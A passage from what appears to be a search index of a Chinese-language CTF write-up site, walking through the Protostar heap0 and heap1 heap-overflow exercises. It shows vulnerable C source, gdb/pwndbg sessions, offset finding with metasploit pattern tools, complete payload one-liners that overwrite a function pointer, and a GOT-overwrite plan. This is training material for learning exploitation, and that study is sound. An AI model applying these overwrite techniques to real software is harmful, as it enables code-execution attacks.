f-&gt;fp();\n\n}\n</code></pre>","text":"<p>\u9898\u76ee\u5206\u6790 <pre><code>- \u7a0b\u5e8f\u5206\u914d\u4e86\u4e24\u4e2a\u76f8\u90bb\u7684\u5806\u5757\uff1a`d` (\u7c7b\u578b\u4e3a `struct data`\uff0c\u5305\u542b\u4e00\u4e2a 64 \u5b57\u8282\u7684 `name` \u6570\u7ec4) \u548c `f` (\u7c7b\u578b\u4e3a `struct fp`\uff0c\u5305\u542b\u4e00\u4e2a\u51fd\u6570\u6307\u9488 `fp`)\u3002\n- \u7a0b\u5e8f\u5c06 `f-&gt;fp` \u521d\u59cb\u5316\u4e3a\u6307\u5411 `nowinner` \u51fd\u6570\u3002\n- \u7a0b\u5e8f\u5c06\u547d\u4ee4\u884c\u53c2\u6570 `argv[1]` \u4f7f\u7528 `strcpy` \u590d\u5236\u5230 `d-&gt;name` \u4e2d\u3002`strcpy` \u4e0d\u4f1a\u68c0\u67e5\u76ee\u6807\u7f13\u51b2\u533a\u7684\u957f\u5ea6\uff0c\u8fd9\u662f\u6f0f\u6d1e\u6240\u5728\u3002\n- \u6700\u540e\uff0c\u7a0b\u5e8f\u8c03\u7528 `f-&gt;fp()`\uff0c\u671f\u671b\u8f93\u51fa \"level has not been passed\"\u3002\n</code></pre></p> <p>\u5229\u7528\u601d\u8def <pre><code>- `strcpy`\u590d\u5236`argv[1]`\u65f6\uff0c\u5982\u679c\u53c2\u6570\u957f\u5ea6\u8d85\u8fc764\u5b57\u8282\uff0c\u5c31\u4f1a\u6ea2\u51fa`d`\u7684\u5806\u5757\uff0c\u4ece\u800c\u8986\u76d6\u76f8\u90bb\u7684`f`\u5806\u5757\u7684\u5185\u5bb9\u3002\n- \u76ee\u6807\u662f\u8986\u76d6`f-&gt;fp`\uff0c\u4f7f\u5176\u6307\u5411`winner`\u51fd\u6570\n</code></pre></p> <p>\u9996\u5148\u786e\u5b9a\u504f\u79fb\u91cf\u4e3a80</p> <pre><code>\u2514\u2500$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100\n\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\n</code></pre> <pre><code>\u2514\u2500$ gdb heap0\nGNU gdb (Debian 16.3-1) 16.3\nCopyright (C) 2024 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\nType \"show copying\" and \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n&lt;https://www.gnu.org/software/gdb/bugs/&gt;.\nFind the GDB manual and other documentation resources online at:\n    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.\n\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nSuccessfully imported six module\nReading symbols from heap0...\n(gdb) r 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'\nStarting program: /opt/protostar/bin/heap0 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\ndata is at 0x804a1a0, fp is at 0x804a1f0\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x37634136 in ?? ()\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[/opt/protostar/bin]\n\u2514\u2500$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37634136  -l 100\n[*] Exact match at offset 80\n</code></pre> <p>\u83b7\u53d6winner \u7684\u5730\u5740\u4e3a0x08048464 <pre><code>\u2514\u2500$ objdump -d ./heap0 |grep winner                                                      \n08048464 &lt;winner&gt;:\n08048478 &lt;nowinner&gt;:\n</code></pre></p> <p>\u6784\u9020exp <pre><code># python2\u5199\u6cd5\nrun $(python2 -c 'print \"A\"*80 + \"\\x64\\x84\\x04\\x08\"')\n</code></pre> </p> <p><pre><code># python3\u5199\u6cd5\n#\u3000python3\u4e0d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\uff50\uff52int\u51fd\u6570\uff08\u9ed8\u8ba4\u4f1a\u5728\u7ed3\u5c3e\u6dfb\u52a0\u4e00\u4e2a\u201d\\n\u201c\uff09\nrun $(python -c 'import sys; sys.stdout.buffer.write(b\"A\"*80 + b\"\\x64\\x84\\x04\\x08\")')\n</code></pre> </p>"},{"location":"pwn/Protostar_heap1/","title":"Protostar heap1","text":""},{"location":"pwn/Protostar_heap1/#heap-one-this-level-takes-a-look-at-code-flow-hijacking-in-data-overwrite-cases-this-level-is-at-optprotostarbinheap1","title":"<pre><code># Heap One\n\nThis level takes a look at code flow hijacking in data overwrite cases.\n\nThis level is at /opt/protostar/bin/heap1\n</code></pre>","text":"<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n\nstruct internet {\n  int priority;\n  char *name;\n};\n\nvoid winner()\n{\n  printf(\"and we have a winner @ %d\\n\", time(NULL));\n}\n\nint main(int argc, char **argv)\n{\n  struct internet *i1, *i2, *i3;\n\n  i1 = malloc(sizeof(struct internet));\n  i1-&gt;priority = 1;\n  i1-&gt;name = malloc(8);\n\n  i2 = malloc(sizeof(struct internet));\n  i2-&gt;priority = 2;\n  i2-&gt;name = malloc(8);\n\n  strcpy(i1-&gt;name, argv[1]);\n  strcpy(i2-&gt;name, argv[2]);\n\n  printf(\"and that's a wrap folks!\\n\");\n}\n</code></pre>"},{"location":"pwn/Protostar_heap1/#pwndbg-disass-winner-dump-of-assembler-code-for-function-winner-0x08048494-0-push-ebp-0x08048495-1-mov-ebpesp-0x08048497-3-sub-esp0x18-0x0804849a-6-mov-dword-ptr-esp0x0-0x080484a1-13-call-0x80483ac-timeplt-0x080484a6-18-mov-edx0x8048630-0x080484ab-23-mov-dword-ptr-esp0x4eax-0x080484af-27-mov-dword-ptr-espedx-0x080484b2-30-call-0x804839c-printfplt-0x080484b7-35-leave-0x080484b8-36-ret-end-of-assembler-dump-pwndbg-disass-ma-main-malloc-mallocgotplt-mallocplt-pwndbg-disass-main-dump-of-assembler-code-for-function-main-0x080484b9-0-push-ebp-0x080484ba-1-mov-ebpesp-0x080484bc-3-and-esp0xfffffff0-0x080484bf-6-sub-esp0x20-0x080484c2-9-mov-dword-ptr-esp0x8-0x080484c9-16-call-0x80483bc-mallocplt-0x080484ce-21-mov-dword-ptr-esp0x14eax-0x080484d2-25-mov-eaxdword-ptr-esp0x14-0x080484d6-29-mov-dword-ptr-eax0x1-0x080484dc-35-mov-dword-ptr-esp0x8-0x080484e3-42-call-0x80483bc-mallocplt-0x080484e8-47-mov-edxeax-0x080484ea-49-mov-eaxdword-ptr-esp0x14-0x080484ee-53-mov-dword-ptr-eax0x4edx-0x080484f1-56-mov-dword-ptr-esp0x8-0x080484f8-63-call-0x80483bc-mallocplt-0x080484fd-68-mov-dword-ptr-esp0x18eax-0x08048501-72-mov-eaxdword-ptr-esp0x18-0x08048505-76-mov-dword-ptr-eax0x2-0x0804850b-82-mov-dword-ptr-esp0x8-0x08048512-89-call-0x80483bc-mallocplt-0x08048517-94-mov-edxeax-0x08048519-96-mov-eaxdword-ptr-esp0x18-0x0804851d-100-mov-dword-ptr-eax0x4edx-0x08048520-103-mov-eaxdword-ptr-ebp0xc-0x08048523-106-add-eax0x4-0x08048526-109-mov-eaxdword-ptr-eax-0x08048528-111-mov-edxeax-0x0804852a-113-mov-eaxdword-ptr-esp0x14-0x0804852e-117-mov-eaxdword-ptr-eax0x4-0x08048531-120-mov-dword-ptr-esp0x4edx-0x08048535-124-mov-dword-ptr-espeax-0x08048538-127-call-0x804838c-strcpyplt-0x0804853d-132-mov-eaxdword-ptr-ebp0xc-0x08048540-135-add-eax0x8-0x08048543-138-mov-eaxdword-ptr-eax-0x08048545-140-mov-edxeax-0x08048547-142-mov-eaxdword-ptr-esp0x18-0x0804854b-146-mov-eaxdword-ptr-eax0x4-0x0804854e-149-mov-dword-ptr-esp0x4edx-0x08048552-153-mov-dword-ptr-espeax-0x08048555-156-call-0x804838c-strcpyplt-0x0804855a-161-mov-dword-ptr-esp0x804864b-0x08048561-168-call-0x80483cc-putsplt-0x08048566-173-leave-0x08048567-174-ret-end-of-assembler-dump","title":"<pre><code>pwndbg&gt; disass winner \nDump of assembler code for function winner:\n   0x08048494 &lt;+0&gt;:     push   ebp\n   0x08048495 &lt;+1&gt;:     mov    ebp,esp\n   0x08048497 &lt;+3&gt;:     sub    esp,0x18\n   0x0804849a &lt;+6&gt;:     mov    DWORD PTR [esp],0x0\n   0x080484a1 &lt;+13&gt;:    call   0x80483ac &lt;time@plt&gt;\n   0x080484a6 &lt;+18&gt;:    mov    edx,0x8048630\n   0x080484ab &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax\n   0x080484af &lt;+27&gt;:    mov    DWORD PTR [esp],edx\n   0x080484b2 &lt;+30&gt;:    call   0x804839c &lt;printf@plt&gt;\n   0x080484b7 &lt;+35&gt;:    leave\n   0x080484b8 &lt;+36&gt;:    ret\nEnd of assembler dump.\npwndbg&gt; disass ma\nmain             malloc           malloc@got[plt]  malloc@plt       \npwndbg&gt; disass main\nDump of assembler code for function main:\n   0x080484b9 &lt;+0&gt;:     push   ebp\n   0x080484ba &lt;+1&gt;:     mov    ebp,esp\n   0x080484bc &lt;+3&gt;:     and    esp,0xfffffff0\n   0x080484bf &lt;+6&gt;:     sub    esp,0x20\n   0x080484c2 &lt;+9&gt;:     mov    DWORD PTR [esp],0x8\n   0x080484c9 &lt;+16&gt;:    call   0x80483bc &lt;malloc@plt&gt;\n   0x080484ce &lt;+21&gt;:    mov    DWORD PTR [esp+0x14],eax\n   0x080484d2 &lt;+25&gt;:    mov    eax,DWORD PTR [esp+0x14]\n   0x080484d6 &lt;+29&gt;:    mov    DWORD PTR [eax],0x1\n   0x080484dc &lt;+35&gt;:    mov    DWORD PTR [esp],0x8\n   0x080484e3 &lt;+42&gt;:    call   0x80483bc &lt;malloc@plt&gt;\n   0x080484e8 &lt;+47&gt;:    mov    edx,eax\n   0x080484ea &lt;+49&gt;:    mov    eax,DWORD PTR [esp+0x14]\n   0x080484ee &lt;+53&gt;:    mov    DWORD PTR [eax+0x4],edx\n   0x080484f1 &lt;+56&gt;:    mov    DWORD PTR [esp],0x8\n   0x080484f8 &lt;+63&gt;:    call   0x80483bc &lt;malloc@plt&gt;\n   0x080484fd &lt;+68&gt;:    mov    DWORD PTR [esp+0x18],eax\n   0x08048501 &lt;+72&gt;:    mov    eax,DWORD PTR [esp+0x18]\n   0x08048505 &lt;+76&gt;:    mov    DWORD PTR [eax],0x2\n   0x0804850b &lt;+82&gt;:    mov    DWORD PTR [esp],0x8\n   0x08048512 &lt;+89&gt;:    call   0x80483bc &lt;malloc@plt&gt;\n   0x08048517 &lt;+94&gt;:    mov    edx,eax\n   0x08048519 &lt;+96&gt;:    mov    eax,DWORD PTR [esp+0x18]\n   0x0804851d &lt;+100&gt;:   mov    DWORD PTR [eax+0x4],edx\n   0x08048520 &lt;+103&gt;:   mov    eax,DWORD PTR [ebp+0xc]\n   0x08048523 &lt;+106&gt;:   add    eax,0x4\n   0x08048526 &lt;+109&gt;:   mov    eax,DWORD PTR [eax]\n   0x08048528 &lt;+111&gt;:   mov    edx,eax\n   0x0804852a &lt;+113&gt;:   mov    eax,DWORD PTR [esp+0x14]\n   0x0804852e &lt;+117&gt;:   mov    eax,DWORD PTR [eax+0x4]\n   0x08048531 &lt;+120&gt;:   mov    DWORD PTR [esp+0x4],edx\n   0x08048535 &lt;+124&gt;:   mov    DWORD PTR [esp],eax\n   0x08048538 &lt;+127&gt;:   call   0x804838c &lt;strcpy@plt&gt;\n   0x0804853d &lt;+132&gt;:   mov    eax,DWORD PTR [ebp+0xc]\n   0x08048540 &lt;+135&gt;:   add    eax,0x8\n   0x08048543 &lt;+138&gt;:   mov    eax,DWORD PTR [eax]\n   0x08048545 &lt;+140&gt;:   mov    edx,eax\n   0x08048547 &lt;+142&gt;:   mov    eax,DWORD PTR [esp+0x18]\n   0x0804854b &lt;+146&gt;:   mov    eax,DWORD PTR [eax+0x4]\n   0x0804854e &lt;+149&gt;:   mov    DWORD PTR [esp+0x4],edx\n   0x08048552 &lt;+153&gt;:   mov    DWORD PTR [esp],eax\n   0x08048555 &lt;+156&gt;:   call   0x804838c &lt;strcpy@plt&gt;\n   0x0804855a &lt;+161&gt;:   mov    DWORD PTR [esp],0x804864b\n   0x08048561 &lt;+168&gt;:   call   0x80483cc &lt;puts@plt&gt;\n   0x08048566 &lt;+173&gt;:   leave\n   0x08048567 &lt;+174&gt;:   ret\nEnd of assembler dump.\n</code></pre>","text":"<p>\u4ece\u4ee3\u7801\u4e2d\u53ef\u4ee5\u770b\u5230\uff0cp1\u548cp2\u7684\u5185\u5b58\u5e03\u5c40\u662f\u7d27\u6328\u7740\u7684\uff0c\u5982\u4e0b\uff1a <pre><code>\u5806\u5185\u5b58\u5e03\u5c40\uff08\u5927\u81f4\u987a\u5e8f\uff09\uff1a\n\u4f4e\u5730\u5740\n---\n\u57571: [0x00000001] [\u6307\u9488\u6307\u5411\u57572(chunkA)]   (8\u5b57\u8282)  \u2190 p1\u6307\u5411\u8fd9\u91cc\n---\n\u57572: [argv[1]\u7684\u6570\u636e]                     (8\u5b57\u8282)  \u2190 chunkA\uff0c\u53ef\u6ea2\u51fa\n---\n\u57573: [0x00000002] [\u6307\u9488\u6307\u5411\u57574(chunkB)]   (8\u5b57\u8282)  \u2190 p2\u6307\u5411\u8fd9\u91cc\n---\n\u57574: [argv[2]\u7684\u6570\u636e]                     (8\u5b57\u8282)  \u2190 chunkB\n---\n\u9ad8\u5730\u5740\n\n\u6808\u4e0a\u5b58\u50a8\uff1a\n- [esp+0x14] \u5b58\u50a8p1\u7684\u5730\u5740\n- [esp+0x18] \u5b58\u50a8p2\u7684\u5730\u5740\n</code></pre></p> <p>\u7531\u4e8e <code>chunkA</code> \u548c <code>chunkB</code> \u5404\u53ea\u6709 8 \u5b57\u8282 \u4e14\u7a0b\u5e8f\u7528 <code>strcpy</code> \u590d\u5236\u7528\u6237\u8f93\u5165\uff08\u65e0\u957f\u5ea6\u68c0\u67e5\uff09\u2192 \u6ea2\u51fa\u53ef\u8986\u76d6\u76f8\u90bb\u5185\u5b58</p> <p>\u7531\u4e8e\u51fd\u6570\u6267\u884c\u4e2d\u53ea\u8c03\u7528\u4e86puts@plt ,\u6240\u4ee5\u6211\u4eec\u9700\u8981\u901a\u8fc7\u6ea2\u51fa\u5bf9\u5176\u8fdb\u884c\u52ab\u6301\uff1a \u6211\u4eec\u901a\u8fc7\u7b2c\u4e00\u4e2a\u53c2\u6570\uff08argv[1]\uff09\u6ea2\u51fa <code>chunkA</code>\uff0c\u8986\u76d6\u4e86 <code>p2</code> \u7ed3\u6784\u4f53\u4e2d\u7684\u201cname\u6307\u9488\u201d\uff08\u5373 p2[1]\uff09\uff0c\u628a\u5b83\u4ece\u6307\u5411 <code>chunkB</code> \u6539\u6210\u6307\u5411 <code>puts@GOT</code> \u7136\u540e\uff0c\u7a0b\u5e8f\u6267\u884c\u4ece<code>strcpy(p2[1], argv[2]);</code>\u53d8\u6210<code>strcpy(puts@GOT, winner\u5730\u5740);</code> \u8fd9\u6837\u5c31\u4f1a\u628a <code>winner</code> \u7684\u5730\u5740\u5199\u8fdb\u4e86 <code>puts@GOT</code> \u6700\u540e\uff0c\u7a0b\u5e8f\u8c03\u7528 <code>puts(...)</code> \u65f6\uff0c\u4f1a\u53bb GOT \u8868\u91cc\u627e <code>puts</code> \u7684\u771f\u5b9e\u5730\u5740 \u2014\u2014 \u7ed3\u679c\u627e\u5230\u7684\u662f <code>winner</code> \u2192 \u7a0b\u5e8f\u8df3\u8f6c\u5230 <code>winner</code></p> <p>\u627e\u5230winner\u7684\u5730\u5740 <pre><code>\u2514\u2500$ objdump -t heap1 |grep winner\n08048494 g     F .text  00000025              winner\n</code></pre></p> <p>\u627e\u5230puts@got\u7684\u5730\u5740 <pre><code>\u2514\u2500$ objdump -TR heap1 |grep puts \n00000000      DF *UND*  00000000 (GLIBC_2.0)  puts\n08049774 R_386_JUMP_SLOT   puts@GLIBC_2.0\n</code></pre></p> <p>\u83b7\u53d6\u504f\u79fb\u91cf <pre><code>\u2514\u2500$ gdb-pwndbg  heap1\nSuccessfully imported six module\nReading symbols from heap1...\npwndbg: loaded 207 pwndbg commands. Type pwndbg [filter] for a list.\npwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.\n------- tip of the day (disable with set show-tips off) -------\nPwndbg context displays where the program branches to thanks to emulating few instructions into the future. You can disable this with set emulate off which may also speed up debugging\npwndbg&gt; disass main\nDump of assembler code for function main:\n   0x080484b9 &lt;+0&gt;:     push   ebp\n   0x080484ba &lt;+1&gt;:     mov    ebp,esp\n   0x080484bc &lt;+3&gt;:     and    esp,0xfffffff0\n   0x080484bf &lt;+6&gt;:     sub    esp,0x20\n   0x080484c2 &lt;+9&gt;:     mov    DWORD PTR [esp],0x8\n   0x080484c9 &lt;+16&gt;:    call   0x80483bc &lt;malloc@plt&gt;\n   0x080484ce &lt;+21&gt;:    mov    DWORD PTR [esp+0x14],eax\n   0x080484d2 &lt;+25&gt;:    mov    eax,DWORD PTR [esp+0x14]\n   0x080484d6 &lt;+29&gt;:    mov    DWORD PTR [eax],0x1\n   0x080484dc &lt;+35&gt;:    mov    DWORD PTR [esp],0x8\n   0x080484e3 &lt;+42&gt;:    call   0x80483bc &lt;malloc@plt&gt;\n   0x080484e8 &lt;+47&gt;:    mov    edx,eax\n   0x080484ea &lt;+49&gt;:    mov    eax,DWORD PTR [esp+0x14]\n   0x080484ee &lt;+53&gt;:    mov    DWORD PTR [eax+0x4],edx\n   0x080484f1 &lt;+56&gt;:    mov    DWORD PTR [esp],0x8\n   0x080484f8 &lt;+63&gt;:    call   0x80483bc &lt;malloc@plt&gt; //\u8c03\u7528 malloc \u5206\u914d 8 \u5b57\u8282\u5185\u5b58,malloc \u6210\u529f\u540e\uff0c**\u8fd4\u56de\u503c\uff08\u5806\u5730\u5740\uff09\u4fdd\u5b58\u5728 `eax` \u5bc4\u5b58\u5668\u4e2d**\n   0x080484fd &lt;+68&gt;:    mov    DWORD PTR [esp+0x18],eax //\u628a `eax` \u7684\u503c\uff08\u4e5f\u5c31\u662f malloc \u8fd4\u56de\u7684\u5806\u5730\u5740\uff09\uff0c**\u5b58\u5230\u6808\u4e0a\u7684\u4e00\u4e2a\u4f4d\u7f6e\uff1a`[esp+0x18]`**,\u5373\u7a0b\u5e8f\u4e2d\u201c\u4fdd\u5b58 p2 \u6307\u9488\u7684\u4e34\u65f6\u53d8\u91cf\u201d\u7684\u5730\u5740\n   0x08048501 &lt;+72&gt;:    mov    eax,DWORD PTR [esp+0x18]\n   0x08048505 &lt;+76&gt;:    mov    DWORD PTR [eax],0x2\n   0x0804850b &lt;+82&gt;:    mov    DWORD PTR [esp],0x8\n   0x08048512 &lt;+89&gt;:    call   0x80483bc &lt;malloc@plt&gt;\n   0x08048517 &lt;+94&gt;:    mov    edx,eax\n   0x08048519 &lt;+96&gt;:    mov    eax,DWORD PTR [esp+0x18]\n   0x0804851d &lt;+100&gt;:   mov    DWORD PTR [eax+0x4],edx\n   0x08048520 &lt;+103&gt;:   mov    eax,DWORD PTR [ebp+0xc]\n   0x08048523 &lt;+106&gt;:   add    eax,0x4\n   0x08048526 &lt;+109&gt;:   mov    eax,DWORD PTR [eax]\n   0x08048528 &lt;+111&gt;:   mov    edx,eax\n   0x0804852a &lt;+113&gt;:   mov    eax,DWORD PTR [esp+0x14]\n   0x0804852e &lt;+117&gt;:   mov    eax,DWORD PTR [eax+0x4]\n   0x08048531 &lt;+120&gt;:   mov    DWORD PTR [esp+0x4],edx\n   0x08048535 &lt;+124&gt;:   mov    DWORD PTR [esp],eax\n   0x08048538 &lt;+127&gt;:   call   0x804838c &lt;strcpy@plt&gt;\n   0x0804853d &lt;+132&gt;:   mov    eax,DWORD PTR [ebp+0xc]\n   0x08048540 &lt;+135&gt;:   add    eax,0x8\n   0x08048543 &lt;+138&gt;:   mov    eax,DWORD PTR [eax]\n   0x08048545 &lt;+140&gt;:   mov    edx,eax\n   0x08048547 &lt;+142&gt;:   mov    eax,DWORD PTR [esp+0x18]\n   0x0804854b &lt;+146&gt;:   mov    eax,DWORD PTR [eax+0x4]\n   0x0804854e &lt;+149&gt;:   mov    DWORD PTR [esp+0x4],edx\n   0x08048552 &lt;+153&gt;:   mov    DWORD PTR [esp],eax\n   0x08048555 &lt;+156&gt;:   call   0x804838c &lt;strcpy@plt&gt;\n   0x0804855a &lt;+161&gt;:   mov    DWORD PTR [esp],0x804864b\n   0x08048561 &lt;+168&gt;:   call   0x80483cc &lt;puts@plt&gt;\n   0x08048566 &lt;+173&gt;:   leave\n   0x08048567 &lt;+174&gt;:   ret\nEnd of assembler dump.\npwndbg&gt; b *main+127\nBreakpoint 1 at 0x8048538: file heap1/heap1.c, line 31.\npwndbg&gt; run AAAA BBBB\nStarting program: /opt/protostar/bin/heap1 AAAA BBBB\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n\nBreakpoint 1, 0x08048538 in main (argc=3, argv=0xffffcf54) at heap1/heap1.c:31\nwarning: 31     heap1/heap1.c: No such file or directory\nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS / show-flags off / show-compact-regs off ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n EAX  0x804a1b0 \u25c2\u2014 0\n EBX  0xf7f95e14 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x232d0c /* '\\x0c-#' */\n ECX  0\n EDX  0xffffd159 \u25c2\u2014 'AAAA'\n EDI  0xf7ffcb60 (_rtld_global_ro) \u25c2\u2014 0\n ESI  0x8048580 (__libc_csu_init) \u25c2\u2014 push ebp\n EBP  0xffffce98 \u25c2\u2014 0\n ESP  0xffffce70 \u2014\u25b8 0x804a1b0 \u25c2\u2014 0\n EIP  0x8048538 (main+127) \u2014\u25b8 0xfffe4fe8 \u25c2\u2014 0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM / i386 / set emulate on ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba 0x8048538 &lt;main+127&gt;    call   strcpy@plt                  &lt;strcpy@plt&gt;\n        dest: 0x804a1b0 \u25c2\u2014 0\n        src: 0xffffd159 \u25c2\u2014 'AAAA'\n\n   0x804853d &lt;main+132&gt;    mov    eax, dword ptr [ebp + 0xc]\n   0x8048540 &lt;main+135&gt;    add    eax, 8\n   0x8048543 &lt;main+138&gt;    mov    eax, dword ptr [eax]\n   0x8048545 &lt;main+140&gt;    mov    edx, eax\n   0x8048547 &lt;main+142&gt;    mov    eax, dword ptr [esp + 0x18]\n   0x804854b &lt;main+146&gt;    mov    eax, dword ptr [eax + 4]\n   0x804854e &lt;main+149&gt;    mov    dword ptr [esp + 4], edx\n   0x8048552 &lt;main+153&gt;    mov    dword ptr [esp], eax\n   0x8048555 &lt;main+156&gt;    call   strcpy@plt                  &lt;strcpy@plt&gt;\n\n   0x804855a &lt;main+161&gt;    mov    dword ptr [esp], 0x804864b\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n00:0000\u2502 esp 0xffffce70 \u2014\u25b8 0x804a1b0 \u25c2\u2014 0\n01:0004\u2502-024 0xffffce74 \u2014\u25b8 0xffffd159 \u25c2\u2014 'AAAA'\n02:0008\u2502-020 0xffffce78 \u25c2\u2014 0\n... \u2193        2 skipped\n05:0014\u2502-014 0xffffce84 \u2014\u25b8 0x804a1a0 \u25c2\u2014 1\n06:0018\u2502-010 0xffffce88 \u2014\u25b8 0x804a1c0 \u25c2\u2014 2\n07:001c\u2502-00c 0xffffce8c \u25c2\u2014 0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ BACKTRACE ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba 0 0x8048538 main+127\n   1 0xf7d87cc3 __libc_start_call_main+115\n   2 0xf7d87d88 __libc_start_main+136\n   3 0x8048401 